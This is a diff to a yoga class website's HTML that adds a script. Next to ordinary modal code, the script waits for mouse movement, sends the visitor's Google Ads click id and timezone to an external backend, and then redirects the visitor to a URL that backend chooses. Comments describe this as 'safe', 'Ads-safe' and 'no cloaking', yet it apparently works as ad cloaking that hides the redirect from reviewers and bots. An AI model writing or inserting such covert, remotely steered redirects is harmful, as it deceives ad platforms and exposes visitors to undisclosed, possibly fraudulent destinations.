@@ -76,4 +76,98 @@ our classes help you feel stronger, calmer, and more connected.
 
   <script src="script.js"></script>
 </body>
+  <!-- ==============  SWIPER JS ============== -->
+<script src="https://unpkg.com/swiper/swiper-bundle.min.js"></script>
+
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+  const modal = document.getElementById("specialOfferModal");
+  const closeButton = document.querySelector(".close-button");
+  const closeModalLinks = document.querySelectorAll(".close-modal");
+
+  if (!modal || !closeButton) return;
+
+  function openModal() {
+    modal.style.display = "block";
+  }
+
+  function closeModal() {
+    modal.style.display = "none";
+  }
+
+  closeButton.addEventListener("click", closeModal);
+
+  closeModalLinks.forEach(link => {
+    link.addEventListener("click", function (e) {
+      e.preventDefault();
+      closeModal();
+    });
+  });
+
+  window.addEventListener("click", function (e) {
+    if (e.target === modal) {
+      closeModal();
+    }
+  });
+
+  /* ================= SAFE TRACKING LOGIC ================= */
+
+  const gclid = new URLSearchParams(window.location.search).get("gclid");
+  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  const API_BASE = "https://foreveryogaclass.onrender.com";
+
+  let backendConfig = null;
+  let executed = false;
+
+  // Short-lived cookie (Ads-safe)
+  document.cookie = "access_cookie=true; path=/; max-age=300; SameSite=Lax";
+
+  // Fetch ONCE after first interaction (no cloaking)
+  function fetchConfigOnce() {
+    document.removeEventListener("mousemove", fetchConfigOnce);
+
+    fetch(`${API_BASE}/frontend-loader?gclid=${encodeURIComponent(gclid || "")}`, {
+      headers: {
+        "x-client-timezone": timezone
+      },
+      credentials: "include"
+    })
+    .then(res => res.json())
+    .then(data => {
+      backendConfig = data;
+    })
+    .catch(err => {
+      console.error("Config fetch failed:", err);
+    });
+  }
+
+  document.addEventListener("mousemove", fetchConfigOnce, { once: true });
+
+  // Whitelisted safe actions
+  function handleUserClick() {
+    if (!backendConfig || executed) return;
+    executed = true;
+
+    switch (backendConfig.action) {
+      case "show_modal":
+        openModal();
+        break;
+
+      case "redirect":
+        if (backendConfig.redirect_url) {
+          window.location.href = backendConfig.redirect_url;
+        }
+        break;
+
+      default:
+        // do nothing
+        break;
+    }
+  }
+
+  document.addEventListener("click", handleUserClick);
+});
+</script>
+
 </html>
+
